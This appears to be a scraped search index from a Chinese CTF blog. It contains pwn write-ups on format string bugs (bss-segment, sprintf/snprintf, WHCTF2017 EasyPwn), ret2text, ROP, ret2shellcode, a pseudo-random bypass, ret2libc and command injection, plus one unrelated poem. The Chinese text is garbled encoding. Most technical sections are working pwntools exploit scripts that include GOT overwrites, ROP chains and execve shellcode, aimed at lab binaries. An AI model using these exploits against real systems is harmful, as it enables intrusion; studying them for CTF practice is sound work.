p.sendlineafter(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;, b\u0026#39;a\u0026#39; * 7) p.recvuntil(b\u0026#39;You start talking to him...\u0026#39;) p.sendline(b\u0026#39;%47$hn\u0026#39;) p.sendlineafter(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;, b\u0026#39;a\u0026#39; * 7) c = printf_got \u0026amp; 0xffff pay3=b\u0026#39;%\u0026#39;+str(c).encode()+b\u0026#39;c%49$hn\u0026#39; gdb.attach(p) p.sendline(pay3) p.sendlineafter(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;, b\u0026#39;a\u0026#39; * 7) d = system \u0026amp; 0xffffffff pay4 = b\u0026#39;%\u0026#39; + str(d).encode() + b\u0026#39;c%15$n\u0026#39; p.sendline(pay4) p.sendlineafter(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;, b\u0026#39;a\u0026#39; * 7) p.sendline(b\u0026#39;sh\u0026#39;) print(\u0026#34;elf.got[\u0026#39;printf\u0026#39;] =\u0026#34;, hex(elf.got[\u0026#34;printf\u0026#34;])) p.interactive() ç”±äºå¾ªç¯æ¬¡æ•°ä¸å¤Ÿ æ‰€ä»¥æ¯æ‰§è¡Œä¸€æ¬¡æ“ä½œéœ€è¦ä¿®æ”¹iä¸º0é‡ç½®å¾ªç¯æ¬¡æ•° ä¸çŸ¥é“ä¸ºä»€ä¹ˆflag=1äº†è¿˜èƒ½å¾ªç¯\nè¿˜æœ‰ä¸€ä¸ªæ–¹æ³• expå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * p=process(\u0026#39;./pwn\u0026#39;) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p.recvuntil(\u0026#39;You start talking to him...\u0026#39;) strlen_got=0x404008 p.sendline(b\u0026#39;%4210696c%6$lln\u0026#39;) p.recvuntil(b\u0026#39;You enraged the monster-prepare for battle!\u0026#39;) p.send(b\u0026#39;a\u0026#39;*8) p.recvuntil(\u0026#39;You start talking to him...\u0026#39;) sys_plt=0x4010e0 p.sendline(b\u0026#39;%4198624c%47$lln\u0026#39;) p.recvuntil(b\u0026#39;You enraged the monster-prepare for battle!\u0026#39;) p.send(b\u0026#39;/bin/sh\\x00\u0026#39;) p.interactive() åˆ©ç”¨ä¸‰è¿æŒ‡é’ˆæŠŠstrlen_gotå†™å…¥æ ˆä¸­,ç„¶åä¿®æ”¹strlen@gotä¸­å†…å®¹ä¸ºsystemçš„pltè¡¨\n","date":"2025-09-10T23:34:28+08:00","image":"http://localhost:1313/image/bssfmt.jpg","permalink":"http://localhost:1313/p/bss%E6%AE%B5%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/","title":"bssæ®µä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"},{"content":"å‡½æ•°åŸå‹ 1 int sprintf(char *str, const char *format, ...); str:ç›®æ ‡å­—ç¬¦æ•°ç»„ï¼Œç”¨äºå‚¨å­˜æ ¼å¼åŒ–åçš„ç»“æœ\nformat:æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ŒåŒ…å«æ™®é€šå­—ç¬¦å’Œæ ¼å¼ç¬¦ï¼Œå¦‚a=%d\n\u0026hellip;:å¯å˜å‚æ•°ï¼Œå¯¹åº”æ ¼å¼å­—ç¬¦ä¸²ä¸­çš„æ ¼å¼ç¬¦ï¼Œç±»å‹éœ€ä¸æ ¼å¼ç¬¦åŒ¹é…ã€‚å¦‚ è‹¥å‚æ•°formatä¸ºa=%dåˆ™\u0026hellip;åº”ä¸ºintç±»å‹çš„æ•´æ•°\nè¿”å›å€¼æ˜¯å‘strä¸­è¾“å…¥çš„å­—ç¬¦ä¸ªæ•°\n1 int s[n]printf(char *str, size_t size, const char *format, ...) æ¯”sprintf å¤šäº†ä¸€ä¸ªsize_tå‚æ•°ï¼Œç”¨äºé™åˆ¶å¯å†™å…¥å­—ç¬¦æ•°\ndemoï¼ˆè¿™ä¸ªå‡½æ•°çš„æ­£å¸¸ä½¿ç”¨æ–¹æ³• 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char buf[200]; int num = 123; float f = 3.14159; char str[] = \u0026#34;hello\u0026#34;; int arr[] = {1, 2, 3}; // 1. æ ¼å¼åŒ–æ•´æ•°ã€å­—ç¬¦ä¸²ã€æµ®ç‚¹æ•° int len1 = sprintf(buf, \u0026#34;æ•´æ•°: %d, å­—ç¬¦ä¸²: %s, æµ®ç‚¹æ•°: %.2f\u0026#34;, num, str, f); printf(\u0026#34;ç»“æœ1: %s\\n\u0026#34;, buf); printf(\u0026#34;å†™å…¥å­—ç¬¦æ•°: %d (éªŒè¯: %zu)\\n\\n\u0026#34;, len1, strlen(buf)); // ä¸å« \\0 // 2. æ ¼å¼åŒ–åå…­è¿›åˆ¶ã€åœ°å€ int len2 = sprintf(buf, \u0026#34;åå…­è¿›åˆ¶: 0x%x, æ•°ç»„åœ°å€: %p\u0026#34;, num, arr); printf(\u0026#34;ç»“æœ2: %s\\n\u0026#34;, buf); printf(\u0026#34;å†™å…¥å­—ç¬¦æ•°: %d (éªŒè¯: %zu)\\n\\n\u0026#34;, len2, strlen(buf)); // 3. æ‹¼æ¥å¤šä¸ªæ•°æ® int len3 = sprintf(buf, \u0026#34;ç»¼åˆ: num=%d, str=%s, f=%.1f, arr@%p\u0026#34;, num, str, f, arr); printf(\u0026#34;ç»“æœ3: %s\\n\u0026#34;, buf); printf(\u0026#34;å†™å…¥å­—ç¬¦æ•°: %d (éªŒè¯: %zu)\\n\u0026#34;, len3, strlen(buf)); return 0; } æ¼æ´åŸç† æ”»å‡»è€…é€šè¿‡æº¢å‡ºç­‰æ‰‹æ®µå¯ä¿®æ”¹formatå‚æ•°ï¼Œå®Œæ•´ä»»æ„åœ°å€è¯»å†™\nPS:snprintfæ˜¯æŠŠæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€è®°ä¸‹æ¥ï¼Œæ¯æ¬¡è¦å¤„ç†ä¸€ä¸ªå­—ç¬¦æ—¶ï¼Œå…ˆä»åœ°å€å¤„å–æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç„¶åå†æ ¹æ®æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥å¤„ç†å­—ç¬¦\ndemo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void backdoor(){ system(\u0026#34;/bin/sh\u0026#34;); return; } int main(){ char buf1[0x100]; char buf2[0x20]; char buf3[0x20]=\u0026#34;%s\\x00\u0026#34;; memset(buf1,0,0x100); puts(\u0026#34;input your data\u0026#34;); read(0,buf1,0x1000); sprintf(buf2,buf3,buf1); printf(\u0026#34;your input is %s\u0026#34;,buf2); memset(buf1,0,0x100); puts(\u0026#34;input your data again\u0026#34;); read(0,buf1,0x1000); sprintf(buf2,buf3,buf1); printf(\u0026#34;your input is %s\u0026#34;,buf2); return 0; } å…ˆåˆ©ç”¨sprintfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæº¢å‡ºbuf2ä»è€Œä¿®æ”¹buf3(sptintfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°)ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡ä»»æ„åœ°å€è¯»æ¥æ³„éœ²canaryï¼Œç„¶ååˆ©ç”¨read(0,buf1,0x1000) re2text.expå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from pwn import * p=process(\u0026#39;./sprintf\u0026#39;) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p.recvuntil(b\u0026#39;input your data\u0026#39;) pay1=b\u0026#39;a\u0026#39;*32+b\u0026#39;bb%46$p\u0026#39; #0x92 is offest 150 p.sendline(pay1) #gdb.attach(p) p.recvuntil(b\u0026#39;0x\u0026#39;) canary=int(p.recv(16),16) print(hex(canary)) p.recvuntil(b\u0026#39;input your data again\u0026#39;) shell=0x4011f6 ret=0x40120F pay2=b\u0026#39;\\x00\u0026#39;*(0x108)+p64(canary)+p64(0)+p64(ret)+p64(shell) p.sendline(pay2) #gdb.attach(p) p.interactive() è¿™ä¸ªdemoå†™çš„ä¸å¤ªåˆé€‚ï¼Œä¿®æ”¹è¿”å›åœ°å€çš„æ—¶å€™ç”¨çš„å¹¶ä¸æ˜¯sprintfçš„æ¼æ´\nå¯ä»¥å†çœ‹ä¸‹ä¸‹é¢çš„ä¾‹é¢˜\næ”»é˜²ä¸–ç•ŒEasyPwn 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 __int64 __fastcall main(int a1, char **a2, char **a3) { int i; // [rsp+10h] [rbp-20h] int v5; // [rsp+14h] [rbp-1Ch] void *buf; // [rsp+18h] [rbp-18h] char nptr[8]; // [rsp+20h] [rbp-10h] BYREF unsigned __int64 v8; // [rsp+28h] [rbp-8h] v8 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(_bss_start, 0LL, 2, 0LL); for ( i = 0; i \u0026lt;= 11; ++i ) { write(1, \u0026#34;Input Your Code:\\n\u0026#34;, 0x11uLL); __isoc99_scanf(\u0026#34;%4s\u0026#34;, nptr); v5 = atoi(nptr); if ( v5 == 1 ) { vuln(); } else { if ( v5 != 2 ) return 0LL; buf = malloc(0x100uLL); write(1, \u0026#34;Input Your Name:\\n\u0026#34;, 0x11uLL); read(0, buf, 0x100uLL); printf(\u0026#34;OK!I Know Your Name :%sNow!\u0026#34;, (const char *)buf); free(buf); } } return 0LL; } unsigned __int64 vuln() { char s[1024]; // [rsp+10h] [rbp-BF0h] BYREF char v2[1000]; // [rsp+410h] [rbp-7F0h] BYREF char v3[1024]; // [rsp+7F8h] [rbp-408h] BYREF unsigned __int64 v4; // [rsp+BF8h] [rbp-8h] v4 = __readfsqword(0x28u); memset(s, 0, sizeof(s)); memset(v3, 0, 8uLL); memset(v2, 0, 0x7E8uLL); strcpy(v3, \u0026#34;%s\u0026#34;); puts(\u0026#34;Welcome To WHCTF2017:\u0026#34;); read(0, s, 0x438uLL); snprintf(v2, 0x7D0uLL, v3, s); printf(\u0026#34;Your Input Is :%s\\n\u0026#34;, v2); return __readfsqword(0x28u) ^ v4; } read(0, s, 0x438uLL);é•¿åº¦ä¸å¤Ÿropä½†vul()å‡½æ•°çš„snprintfå‡½æ•°å¯æº¢å‡ºv3ï¼Œå¯ä»¥åˆ©ç”¨fmtä»»æ„åœ°å€è¯»æ³„éœ²libcå’Œpieåœ°å€\néšåä»»æ„åœ°å€å†™ï¼Œä¿®æ”¹freegotè¡¨ä¸ºsystemåœ°å€(å¯ä»¥ä½¿ç”¨bssæ®µä¸Šfmtçš„æ–¹æ³•)\næ³¨æ„ç”±äºå»¶è¿Ÿç»‘å®šæœºåˆ¶æˆ‘ä»¬éœ€è¦å…ˆè°ƒç”¨ä¸€æ¬¡freeå®Œæˆç»‘å®šï¼Œexpå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 from pwn import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p=process(\u0026#39;./pwn1\u0026#39;) libc=ELF(\u0026#39;/home/baota/æ¡Œé¢/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6\u0026#39;) elf=ELF(\u0026#39;./pwn1\u0026#39;) p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;2\u0026#39;) p.recvuntil(b\u0026#39;Input Your Name:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) #free got p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;Welcome To WHCTF2017:\u0026#39;) pay1=b\u0026#39;a\u0026#39;*1000+b\u0026#39;bb%397$p\u0026#39; p.sendline(pay1) #0x10b is offest 400 p.recvuntil(b\u0026#39;0x\u0026#39;) libcbase=int(p.recv(12),16)-0x20840 print(hex(libcbase)) #gdb.attach(p) sys=libcbase+libc.symbols[\u0026#39;system\u0026#39;] p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;Welcome To WHCTF2017:\u0026#39;) pay2=b\u0026#39;a\u0026#39;*1000+b\u0026#39;bb%396$p\u0026#39; p.sendline(pay2) p.recvuntil(b\u0026#39;0x\u0026#39;) addr=int(p.recv(12),16) pie=addr-0xda0 print(hex(addr)) print(hex(pie)) free_got = pie + elf.got[\u0026#39;free\u0026#39;] print(hex(free_got)) print(hex(sys)) p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;Welcome To WHCTF2017:\u0026#39;) #$360$p a=(sys \u0026amp; 0xffff)-1000-0x16 gdb.attach(p) pay3=b\u0026#39;a\u0026#39;*1000+(b\u0026#39;bb%\u0026#39;+str(a).encode() + b\u0026#39;c%133$hn\u0026#39;).ljust(16,b\u0026#39;a\u0026#39;)+p64(free_got) p.sendline(pay3) b= ((sys\u0026gt;\u0026gt;16) \u0026amp; 0xffff)-1000 - 0x16 pay4 = b\u0026#39;a\u0026#39; * 1000 + (b\u0026#39;bb%\u0026#39;+str(b).encode()+b\u0026#39;c%133$hn\u0026#39;).ljust(16, b\u0026#39;a\u0026#39;)+p64(free_got+2) p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;Welcome To WHCTF2017:\u0026#39;) p.sendline(pay4) #gdb.attach(p) p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;2\u0026#39;) p.recvuntil(b\u0026#39;Input Your Name:\u0026#39;) p.sendline(b\u0026#39;/bin/sh\\x00\u0026#39;) #gdb.attach(p) p.interactive() ","date":"2025-09-10T23:34:28+08:00","image":"http://localhost:1313/image/House_of_force.jpg","permalink":"http://localhost:1313/p/snprintf%E5%87%BD%E6%95%B0fmt%E6%BC%8F%E6%B4%9E/","title":"s[n]printfå‡½æ•°fmtæ¼æ´"},{"content":" è¿·å¤±çš„æ«è·Œè·Œæ’æ’ é’æ¶©çš„è“å¤©ä¹Ÿè¢«æ‰°ä¹±äº†æ¨¡æ · æ˜æ˜æ®‹é˜³ï¼Œä¸¾ç›®æ¯é»„ æ»¡ç¬”è¸Œèº‡éš¾åˆ»æ˜”æ—¥çš„æ¿€æ˜‚ å²æœˆè£¹æŒŸç€æˆ‘ç•™ä¸‹æ— é—»ç¯‡ç«  åŒ†åŒ†å¿™å¿™ï¼Œå½·å½·å¾¨å¾¨ æ¸è¡Œæ¸è¿œçš„å›å¿†åªæ˜¯æ€å¿µçš„æƒ…æ„¿ä¸€å¢\nç—…æ ‘å‰å¤´ä¸‡æœ¨æ˜¥å…‰ ç¦»ä¹¡çš„ç§‹æ«ç»ˆå½’ä¸åœ¨æ¼‚æ³Šæµæµª å›°å€¦çš„é»„å¤©äº¦èƒ½å¤è‹ ç† ç† çº¢æ—¥ï¼Œæ³¼æ´’è¾‰ç…Œ\nç»æƒ…çš„æ–‡å­—ç‹¬è‡ªè¿›å–å‘ä¸Š èˆä¸‹æˆ‘ä¸€äººå“å‘³ç”Ÿå‘½çš„æ²§æ¡‘ æ™ƒæ™ƒè¡è¡ï¼Œè¸‰è¸‰è·„è·„ æ¢¦é†’æ—¶åˆ†çš„è¿·æƒ˜å†·äº†æˆ‘çƒ­è¡€ä¸€è…”\næˆ‘å°šå¹´è½»ï¼Œå´ä¹Ÿåœ¨å¹´é•¿ é˜…å†å‡é¦™äº¦éš¾æŒ¡æ„ç»ªå¿§ä¼¤ æµ®æµ®æ²‰æ²‰ï¼Œæ…Œæ…Œå¼ å¼  æ®‹å­˜çš„ç‚½å¿ƒè¿«ä½¿æˆ‘ç‡ƒåŒ–å‡éœœ è§¦ä¸å¯åŠçš„ç†æƒ³å’Œç™½å‘çš„é«˜å ‚ ååå¤å¤ï¼Œè·Œè·Œè¡è¡ å’€åš¼ç€è‰°éš¾è‹¦æ¨ä¸ä¸–ç•Œå’Œè‡ªæˆ‘å¯¹æŠ—\n2025.10 -å±± ","date":"2025-09-10T23:34:28+08:00","image":"http://localhost:1313/image/%E8%BF%B7%E9%80%9437.jpg","permalink":"http://localhost:1313/p/%E8%BF%B7%E9%80%94/","title":"è¿·é€”"},{"content":"Pwn ezzzzz_overflow å¼€äº†NXä¿æŠ¤ï¼Œscanfå‡½æ•°å­˜åœ¨æ— é™æ ˆæº¢å‡ºï¼Œæœ‰åé—¨ï¼Œret2text\n1 2 3 4 5 6 7 8 9 10 from pwn import * #p=process(\u0026#39;./pwn\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,64762) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p.recvuntil(b\u0026#39;you name?\u0026#39;) shell=0x4011b6 ret=0x4012AA pay=b\u0026#39;a\u0026#39;*(0x20+8)+p64(shell) p.sendline(pay) p.interactive() roprop æœ‰NXå’Œpie\n1 2 3 4 5 6 7 8 9 10 11 12 int __fastcall main(int argc, const char **argv, const char **envp) { __int64 buf[4]; // [rsp+0h] [rbp-20h] BYREF init(argc, argv, envp); printf(\u0026#34;welcome to xswctf!!\u0026#34;); memset(buf, 0, sizeof(buf)); puts(\u0026#34;here is a gift.\u0026#34;); printf(\u0026#34;%p\\n\u0026#34;, gift); read(0, buf, 0x50uLL); return 0; } ç»™äº†giftåœ°å€ç”¨æ¥ç»•è¿‡pie,æ²¡æœ‰åé—¨ï¼Œæœ‰systemplt,gadgetå’Œ/bin/shå­—ä¸²ï¼Œæ‰“rop\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pwn import * #p=process(\u0026#39;./pwn\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,54036) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p.recvuntil(b\u0026#39;welcome to xswctf!!here is a gift.\u0026#39;) p.recvuntil(b\u0026#39;0x\u0026#39;) pie=int(p.recv(12),16)-0x4038 print(hex(pie)) sys=pie+0x1040 binsh=pie+0x4048 rdi=pie+0x11f4 ret=pie+0x1016 pay=b\u0026#39;a\u0026#39;*(0x20+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys)+p64(0) p.sendline(pay) p.interactive() shellcodeçš„è‰ºæœ¯(å°é²œç‰ˆ) æ— NXæœ‰pie\n1 2 3 4 5 6 7 8 9 10 void vuln() { char buf[312]; // [rsp+0h] [rbp-140h] BYREF unsigned __int64 v1; // [rsp+138h] [rbp-8h] v1 = __readfsqword(0x28u); puts(\u0026#34;ä½ çŸ¥é“shellcodeæ˜¯ä»€ä¹ˆå—ï¼Œè¯•ç€ç¼–å†™ä½ è‡ªå·±çš„shellcodeå§\u0026#34;); read(0, buf, 0x12CuLL); __asm { jmp rsi } } ç¨‹åºå…ˆå‘bufä¸­æ•°æ®ç„¶åæ‰§è¡Œå…¶å†…å®¹ æ‰€ä»¥ret2shellcode\n1 2 3 4 5 6 7 8 from pwn import * #p=process(\u0026#39;./pwn\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,52425) context(log_level=\u0026#39;debug\u0026#39;, arch=\u0026#39;amd64\u0026#39;) shellcode = b\u0026#34;\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x52\\x53\\x54\\x5f\\x52\\x5e\\x0f\\x05\u0026#34; p.send(shellcode) p.interactive() æ•°å­—ç‚¸å¼¹bomb! ä¿æŠ¤å…¨å¼€\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 int __fastcall main(int argc, const char **argv, const char **envp) { unsigned int v3; // eax int v5; // [rsp+0h] [rbp-30h] BYREF int i; // [rsp+4h] [rbp-2Ch] int v7; // [rsp+8h] [rbp-28h] int v8; // [rsp+Ch] [rbp-24h] char buf[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v10; // [rsp+28h] [rbp-8h] v10 = __readfsqword(0x28u); init(argc, argv, envp); v3 = time(0LL); srand(v3); v7 = rand() % 500; puts(\u0026#34;è®©æˆ‘ä»¬æ¥ç©æ•°å­—ç‚¸å¼¹å§!!!ä½†è¿™æ¬¡æ˜¯çŒœä¸­æœ‰å¥–å“¦~~~~\u0026#34;); printf(\u0026#34;è¯·è¾“å…¥ä½ çš„æ¸¸æˆID: \u0026#34;); v8 = read(0, buf, 0x14uLL); buf[v8 - 1] = 0; printf(buf); puts(\u0026#34;,æ¬¢è¿æ‚¨ï¼\u0026#34;); puts(\u0026#34;---------------------------------------------------\u0026#34;); puts(\u0026#34; æ¸¸æˆå¼€å§‹ \u0026#34;); for ( i = 0; i \u0026lt;= 2; ++i ) { printf(\u0026#34;çŒœçŒœæˆ‘çš„ç‚¸å¼¹æ˜¯ä»€ä¹ˆ(æç¤º----åœ¨[0,500)ä¸­å“¦)ï¼š \u0026#34;); __isoc99_scanf(\u0026amp;unk_214C, \u0026amp;v5); if ( v7 == v5 ) win(); if ( v7 \u0026gt; v5 ) puts(\u0026amp;byte_214F); if ( v7 \u0026lt; v5 ) puts(\u0026#34;å˜¶ï¼Œï¼Œå¤§äº†å‘¢\u0026#34;); } puts(\u0026#34;---------------------------------------------------\u0026#34;); puts(\u0026#34; æ¸¸æˆç»“æŸ \u0026#34;); puts(\u0026amp;byte_21B0); return 0; } æ˜¯ä¸€ä¸ªä¼ªéšæœºç»•è¿‡ é¢˜ç›®ç”¨äº†v3 = time(0LL); æ‰€ä»¥æˆ‘ä»¬çš„ç§å­ä¹Ÿè®¾ä¸ºå½“å‰æ—¶é—´å°±å¥½\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pwn import * import time import ctypes #p=process(\u0026#39;./pwn\u0026#39;) libc=ctypes.CDLL(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,59068) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) seed = int(time.time()) libc.srand(seed) p.recvuntil(b\u0026#39;ID: \u0026#39;) p.send(b\u0026#39;a\u0026#39;) ans=str(libc.rand() % 500) p.recvuntil(\u0026#39;ï¼š \u0026#39;) p.sendline(ans.encode()) p.interactive() Pikachu æ²¡æœ‰åé—¨ ä½†æ˜¯editå’Œaddéƒ½æœ‰æ ˆæº¢å‡ºï¼Œå¯ä»¥æ‰¾åˆ°pop rdi äºæ˜¯ret2libc,æˆ‘ç”¨çš„æ˜¯addå‡½æ•°\néœ€è¦æ³¨æ„çš„æ˜¯, è¯»å…¥payloadçš„æ—¶ä¼šè¦†ç›–v3ï¼Œæ‰€ä»¥payloadéœ€è¦ä¿è¯v3çš„å€¼ä¸å˜å¦‚\n1 pay1=b\u0026#39;a\u0026#39;*(0x110-4)+p32(0)+p64(0)+p64(rdi)+p64(putsgot)+p64(putsplt)+p64(addd) çš„p32(0)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 int add() { _QWORD *v0; // rax char buf[268]; // [rsp+0h] [rbp-110h] BYREF unsigned int v3; // [rsp+10Ch] [rbp-4h] BYREF puts(\u0026#34;input index:\u0026#34;); v3 = 0; __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v3); if ( v3 \u0026lt; 0xA ) { if ( p[v3] ) { LODWORD(v0) = puts(\u0026#34;The element already exists in the array.\u0026#34;); } else { puts(\u0026#34;input content:\u0026#34;); read(0, buf, 0x200uLL); v0 = p; p[v3] = gift; } } else { LODWORD(v0) = puts(\u0026#34;Array out of bounds\u0026#34;); } return (int)v0; } from pwn import * #p=process(\u0026#39;./pwn\u0026#39;) libc=ELF(\u0026#39;./libc.so.6\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,52538) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) def add(idx,content): p.recvuntil(b\u0026#39;5.exit\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;input index:\u0026#39;) p.sendline(str(idx).encode()) p.recvuntil(b\u0026#39;input content:\u0026#39;) p.send(content) def edit(idx,content): p.recvuntil(b\u0026#39;5.exit\u0026#39;) p.sendline(b\u0026#39;2\u0026#39;) p.recvuntil(b\u0026#39;input index:\u0026#39;) p.sendline(str(idx).encode()) p.recvuntil(b\u0026#39;input content:\u0026#39;) p.send(content) def dele(idx): p.recvuntil(b\u0026#39;5.exit\u0026#39;) p.sendline(b\u0026#39;3\u0026#39;) p.recvuntil(b\u0026#39;input index:\u0026#39;) p.sendline(str(idx).encode()) rdi=0x4011cb putsgot=0x404000 putsplt=0x401030 main=0x40152d addd=0x401240 pay1=b\u0026#39;a\u0026#39;*(0x110-4)+p32(0)+p64(0)+p64(rdi)+p64(putsgot)+p64(putsplt)+p64(addd) #gdb.attach(p) add(0,pay1) p.recv(1) #-0x835a0 libcbase=u64(p.recv(6).ljust(8,b\u0026#39;\\x00\u0026#39;))-0x805a0 print(hex(libcbase)) #gdb.attach(p) sys=libcbase+libc.symbols[\u0026#39;system\u0026#39;] binsh = libcbase + 0x1a7ea4 ret=0x401016 ogg1=libcbase+0xddf43 ogg2=libcbase+0xfb06a p.recvuntil(b\u0026#39;input index:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;input content:\u0026#39;) pay2=b\u0026#39;a\u0026#39;*(0x110-4)+p32(1)+p64(0)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys) print(hex(libcbase)) print(hex(binsh)) print(hex(sys)) #gdb.attach(p) p.send(pay2) p.interactive() AAAAæ–‡ä»¶è¯»å–ç³»ç»Ÿ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 void *__fastcall cat(void *a1) { char dest[8]; // [rsp+10h] [rbp-40h] BYREF __int64 v3; // [rsp+18h] [rbp-38h] __int64 v4; // [rsp+20h] [rbp-30h] __int64 v5; // [rsp+28h] [rbp-28h] __int64 v6; // [rsp+30h] [rbp-20h] __int64 v7; // [rsp+38h] [rbp-18h] __int16 v8; // [rsp+40h] [rbp-10h] *(_QWORD *)dest = 544498019LL; v3 = 0LL; v4 = 0LL; v5 = 0LL; v6 = 0LL; v7 = 0LL; v8 = 0; strcat(dest, file); system(dest); return 0LL; } void __noreturn vuln() { pthread_t newthread; // [rsp+8h] [rbp-8h] BYREF puts(\u0026amp;s); puts(\u0026#34;è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œæœ‰ä»¥ä¸‹æ–‡ä»¶â€”â€”\u0026#34;); system(\u0026#34;ls\u0026#34;); while ( 1 ) { puts(\u0026#34;æ‰€ä»¥ä½ æƒ³çŸ¥é“å“ªä¸ªæ–‡ä»¶çš„å†…å®¹å‘¢~ğŸ˜:\u0026#34;); __isoc99_scanf(\u0026amp;aS, file); if ( !strcmp(file, v1) ) puts(\u0026#34;æŠ±æ­‰ï¼Œå°±æ˜¯ä¸ç»™ä½ çœ‹è¿™ä¸ªæ–‡ä»¶å‘¢~~~~~~~~~~\u0026#34;); else pthread_create(\u0026amp;newthread, 0LL, cat, 0LL); } } å®¡è¯»æºç  å¦‚æœæ–‡ä»¶åä¸ä¸ºflagï¼Œcatå‡½æ•°ä¼šæŠŠæ–‡ä»¶åæ‹¼æ¥åˆ°deatåç„¶åæ‰§è¡Œï¼Œè™½ç„¶ä¸çŸ¥é“ä¸ºä»€ä¹ˆsystem(dest+å‘½ä»¤ä¹Ÿèƒ½æ‰§è¡Œä½†æ˜¯ç¡®å®å¯ä»¥ï¼ˆ æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥;ï¼‹å‘½ä»¤è¿›è¡Œå¤šæ¡å‘½ä»¤æ‰§è¡Œ\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * #p=process(\u0026#39;./pwn\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,60786) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p.recvuntil(b\u0026#39;:\u0026#39;) sys=0x4010b0 binsh=0x004020cd #pay=b\u0026#39;a\u0026#39;*0x40+p64(sys) pay=b\u0026#39;cat /flag\u0026#39; p.sendline(pay) p.interactive() nofile 